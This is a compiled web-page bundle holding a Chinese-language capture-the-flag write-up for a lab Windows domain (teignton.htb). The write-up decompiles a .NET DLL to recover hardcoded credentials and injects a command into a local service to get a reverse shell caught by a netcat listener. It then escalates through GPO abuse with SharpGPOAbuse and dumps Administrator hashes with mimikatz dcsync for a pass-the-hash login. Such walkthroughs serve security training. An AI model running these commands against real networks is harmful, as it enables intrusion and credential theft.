QYgAwEODg4NBwgODg4SEQ4SQRIIAgUgARIVDgYgAgEOEkkEIAASVQMgAAIEIAEOCBkHDg4OHQ4SFQ4SSRJRElUdDhIVHQ4dDggCCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAAAHg7AAAAAAAAAAAAAI47AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAOwAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAEQCAAAAAAAAAAAAAEQCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASkAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACAAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADgACwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcwB0AG8AcgBlAGQALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEAACwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABzAHQAbwByAGUAZAAuAGQAbABsAAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAMAAAAoDsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c06\u5176\u8fdb\u884c Base64 Decode \u4e4b\u540e\uff0c\u5f97\u5230"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:n(57771).Z+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5bf9\u5176\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"ILSpy"})," \u8fdb\u884c\u9006\u5411\u5206\u6790"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-csharp",metastring:'title="StoredProcedures"',children:'using System.Data.SqlClient;\nusing System.IO;\nusing System.Net;\nusing System.Text;\nusing Microsoft.SqlServer.Server;\n\npublic class StoredProcedures\n{\n    [SqlProcedure]\n    public static void BackupClients()\n    {\n        string domain = "TEIGNTON";\n        string userName = "jay.teignton";\n        string password = "D0ntL0seSk3l3tonK3y!";\n        NetworkCredential credentials = new NetworkCredential(userName, password, domain);\n        using (new NetworkConnection("\\\\\\\\WEB\\\\Clients", credentials))\n        {\n            string path = "\\\\\\\\WEB\\\\Clients\\\\clients.html";\n            using StreamWriter streamWriter = new StreamWriter(path);\n            streamWriter.Write(GenerateHTML().ToString());\n        }\n    }\n    // ......\n}\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5f97\u5230\u4e00\u7ec4\u51ed\u636e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:'domain = "TEIGNTON"\nuserName = "jay.teignton"\npassword = "D0ntL0seSk3l3tonK3y!"\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,t.jsx)(e.a,{href:"https://github.com/Hackplayers/evil-winrm",children:"Github - Hackplayers/evil-winrm"})," \u8fdb\u884c\u8fde\u63a5"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"$ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'\nPS C:\\Users\\jay.teignton\\Documents> whoami\nteignton\\jay.teignton\nPS C:\\Users\\jay.teignton\\Documents>\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728 ",(0,t.jsx)(e.code,{children:"WindowsService.exe"})," \u4e2d\u53d1\u73b0"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"PS C:\\Users\\jay.teignton\\Documents> dir\n\n    Directory: C:\\Users\\jay.teignton\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        10/7/2020  10:31 PM          11264 WindowsService.exe\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c06\u8fd9\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"ILSpy"})," \u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u5f97\u5230"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-csharp",children:"public void Start()\n{\n    this.IP = IPAddress.Loopback;\n    this.Endpoint = new IPEndPoint(this.IP, 7734);\n    try\n    {\n        this.Listener = new Socket(this.IP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);\n        this.Listener.Bind(this.Endpoint);\n        this.Listener.Listen(25);\n        for (;;)\n        {\n            Socket handler = this.Listener.Accept();\n            new Thread(delegate()\n            {\n                try\n                {\n                    string data = this.GetClientMessage(handler).Trim();\n                    if (this.CheckClientPassword(handler, data))\n                    {\n                        data = this.GetClientMessage(handler).Trim();\n                        this.CheckClientCommand(handler, data);\n                    }\n                }\n                finally\n                {\n                    handler.Shutdown(SocketShutdown.Both);\n                    handler.Close();\n                }\n            }).Start();\n        }\n    }\n    catch (Exception)\n    {\n    }\n    finally\n    {\n        this.Listener.Shutdown(SocketShutdown.Both);\n    }\n}\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4ee5\u53ca"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-csharp",children:'private bool CheckClientPassword(Socket handler, string data)\n{\n    string[] array = data.Split(new string[]\n    {\n        "password="\n    }, StringSplitOptions.None);\n    if (array.Length != 2 || array[1] == null)\n    {\n        handler.Send(this.ErrorMessage);\n        return false;\n    }\n    if (array[1] != TCPServer.Password())\n    {\n        handler.Send(this.ErrorMessage);\n        return false;\n    }\n    handler.Send(this.SuccessMessage);\n    return true;\n}\n'})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-csharp",children:'private bool CheckClientCommand(Socket handler, string data)\n{\n    string[] array = data.Split(new string[]\n    {\n        "command="\n    }, StringSplitOptions.None);\n    if (array.Length != 2 || array[1] == null)\n    {\n        handler.Send(this.ErrorMessage);\n        return false;\n    }\n    string text = array[1];\n    foreach (string value in new string[]\n    {\n        " ",\n        "Windows",\n        "System32",\n        "PowerShell"\n    })\n    {\n        if (text.Contains(value))\n        {\n            handler.Send(this.ErrorMessage);\n            return false;\n        }\n    }\n    this.CreateClientProcess(text);\n    handler.Send(this.Flag);\n    return true;\n}\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u4e8e\u662f\u4f7f\u7528 ",(0,t.jsx)(e.a,{href:"https://github.com/antonioCoco/ConPtyShell",children:"Github - antonioCoco/ConPtyShell"})," \u8fdb\u884c\u4ea4\u4e92"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"PS C:\\Users\\jay.teignton\\Documents> .\\netcat.exe 127.0.0.1 7734 -v\nWEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open\npassword=2023-04-19-thisisleet\nOK\ncommand=c:\\programdata\\shell.exe\nCONTEXT{l0l_s0c3ts_4re_fun}\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"$ sudo netcat -lvnp 443\nListening on 0.0.0.0 443\nConnection received on 10.13.37.12\nWindows PowerShell running as user andy.teignton on WEB\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32> whoami\nteignton\\andy.teignton\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="Flag"',children:"CONTEXT{l0l_s0c3ts_4re_fun}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"key-to-the-castle",children:"Key to the castle"}),"\n",(0,t.jsx)(e.p,{children:"\u501f\u52a9 GPO \u8fdb\u884c\u63d0\u6743"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'PS C:\\ProgramData> New-GPO -Name privesc -Comment "Privilege Escalation"\n\nDisplayName      : privesc\nDomainName       : TEIGNTON.HTB\nOwner            : TEIGNTON\\andy.teignton\nId               : d85448d7-e996-4863-816c-ef9930ba5206\nGpoStatus        : AllSettingsEnabled\nDescription      : Privilege Escalation\nCreationTime     : 19/04/2023 00:10:22\nModificationTime : 19/04/2023 00:10:22\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 0, SysVol Version: 0\nWmiFilter        :\n\nPS C:\\ProgramData> New-GPLink -Name privesc -Target "OU=Domain Controllers,DC=TEIGNTON,DC=HTB" -LinkEnabled Yes\n\nGpoId       : d85448d7-e996-4863-816c-ef9930ba5206\nDisplayName : privesc\nEnabled     : True\nEnforced    : False\nTarget      : OU=Domain Controllers,DC=TEIGNTON,DC=HTB\nOrder       : 2\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,t.jsx)(e.a,{href:"https://github.com/byronkg/SharpGPOAbuse",children:"Github - byronkg/SharpGPOAbuse"})," \u8fdb\u884c\u5229\u7528"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'PS C:\\ProgramData> .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jay.teignton --gponame privesc\n[+] Domain = teignton.htb\n[+] Domain Controller = WEB.TEIGNTON.HTB\n[+] Distinguished Name = CN=Policies,CN=System,DC=TEIGNTON,DC=HTB\n[+] SID Value of jay.teignton = S-1-5-21-3174020193-2022906219-3623556448-1103\n[+] GUID of "privesc" is: {D85448D7-E996-4863-816C-EF9930BA5206}\n[+] Creating file \\\\teignton.htb\\SysVol\\teignton.htb\\Policies\\{D85448D7-E996-4863-816C-EF9930BA5206}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n[+] versionNumber attribute changed successfully\n[+] The version number in GPT.ini was increased successfully.\n[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!\n\nPS C:\\ProgramData> gpupdate /force\nUpdating policy...\n\nComputer Policy update has completed successfully.\nUser Policy update has completed successfully.\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u518d\u6b21\u767b\u5f55\uff0c\u5373\u53ef\u62e5\u6709 ",(0,t.jsx)(e.code,{children:"Administrators"})," \u6743\u9650"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"$ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'\nPS C:\\Users\\jay.teignton\\Documents> whoami\nteignton\\jay.teignton\nPS C:\\Users\\jay.teignton\\Documents> Get-ADPrincipalGroupMembership -Identity \"jay.teignton\" | Select Name\n\nName\n----\nDomain Users\nAdministrators\nRemote Desktop Users\nRemote Management Users\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u8fdb\u5165 ",(0,t.jsx)(e.code,{children:"C:\\Users\\Administrator"})," \u76ee\u5f55"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"PS C:\\Users\\jay.teignton\\Documents> cd C:\\Users\\Administrator\\Documents\nPS C:\\Users\\Administrator\\Documents> dir\n\n    Directory: C:\\Users\\Administrator\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       10/12/2020   5:53 PM                SQL Server Management Studio\nd-----       10/12/2020   6:53 PM                Visual Studio 2017\n-a----        7/15/2020   8:15 PM             34 flag.txt\n-a----        7/29/2020  12:28 PM            188 info.txt\nPS C:\\Users\\Administrator\\Documents> type flag.txt\nCONTEXT{OU_4bl3_t0_k33p_4_s3cret?}\nPS C:\\Users\\Administrator\\Documents> type info.txt\nCongrats on completing the Fortress. You've got a direct line to the Recruitment Manager! Title your message - FORTRESS COMPLETED and send to recruitment@contextis.com, alongside your CV.\nPS C:\\Users\\Administrator\\Documents>\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4ea6\u6216\u8005\uff0c\u53ef\u4ee5\u901a\u8fc7 NTLM \u51ed\u636e\u8fdb\u884c\u653b\u51fb"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"PS C:\\Users\\jay.teignton\\Documents> .\\mimikatz.exe \"lsadump::dcsync /user:Administrator\" exit\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:teignton.htb /user:Administrator\n[DC] 'teignton.htb' will be the domain\n[DC] 'WEB.TEIGNTON.HTB' will be the DC server\n[DC] 'Administrator' will be the user account\n\nObject RDN           : Administrator\n\n** SAM ACCOUNT **\n\nSAM Username         : Administrator\nUser Principal Name  : Administrator@TEIGNTON.HTB\nAccount Type         : 30000000 (USER_OBJECT)\nUser Account Control : 00010200 (NORMAL_ACCOUNT DONT_EXPIRE_PASSWD)\nAccount expiration   :\nPassword last change : 12/10/2020 14:34:20\nObject Security ID   : S-1-5-21-3174020193-2022906219-3623556448-500\nObject Relative ID   : 500\n\nCredentials:\n  Hash NTLM: 5059c4cf183da02e2f41bb1f53d713cc\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : f0a3bbc4c8a22573685ec11d8b5a76c9\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : WIN-K0IK59G7ILOAdministrator\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 90f5c97ddad9eaf5aa247836e00b7a4c89935258c2a01ce051594cf3cb03798d\n      aes128_hmac       (4096) : 466d899b2f855f4f705cb990a427168a\n      des_cbc_md5       (4096) : c451bf16c416dce0\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:Kerberos *\n    Default Salt : WIN-K0IK59G7ILOAdministrator\n    Credentials\n      des_cbc_md5       : c451bf16c416dce0\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4f7f\u7528\u54c8\u5e0c\u8fdb\u884c\u8fde\u63a5"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"$ evil-winrm -i 10.13.37.12 -u Administrator -H 5059c4cf183da02e2f41bb1f53d713cc\nPS C:\\Users\\Administrator\\Documents> whoami\nteignton\\administrator\nPS C:\\Users\\Administrator\\Documents> type flag.txt\nCONTEXT{OU_4bl3_t0_k33p_4_s3cret?}\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="Flag"',children:"CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}\n"})})]})}function d(A={}){const{wrapper:e}={...(0,s.a)(),...A.components};return e?(0,t.jsx)(e,{...A,children:(0,t.jsx)(o,{...A})}):o(A)}},72539:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240302-160225-cb84229285cbd439447a0f405330f28e.png"},17226:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240312-121257-9697d5d0216d661e4fea1a4799f5b68c.png"},29865:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240317-121712-6958dc0ac00745156de9b8214adad92b.png"},58824:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240317-121753-0f7de6c1a3dcd39646c092dd17006393.png"},57771:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240328-192855-9cf002754de554c6138188b9f300e96e.png"},97473:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240335-163520-86249b58102bb3f34e1dc6c834bef48d.png"},361:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240354-115405-3b0d3091afd56739aee7e537b7fd6adf.png"},58470:(A,e,n)=>{n.d(e,{Z:()=>t});const t=n.p+"assets/images/image_20240357-115753-1a01ee3243d28872245080a259c83a78.png"},11151:(A,e,n)=>{n.d(e,{Z:()=>r,a:()=>i});var t=n(67294);const s={},a=t.createContext(s);function i(A){const e=t.useContext(a);return t.useMemo((function(){return"function"==typeof A?A(e):{...e,...A}}),[e,A])}function r(A){let e;return e=A.disableParentContext?"function"==typeof A.components?A.components(s):A.components||s:i(A.components),t.createElement(a.Provider,{value:e},A.children)}}}]);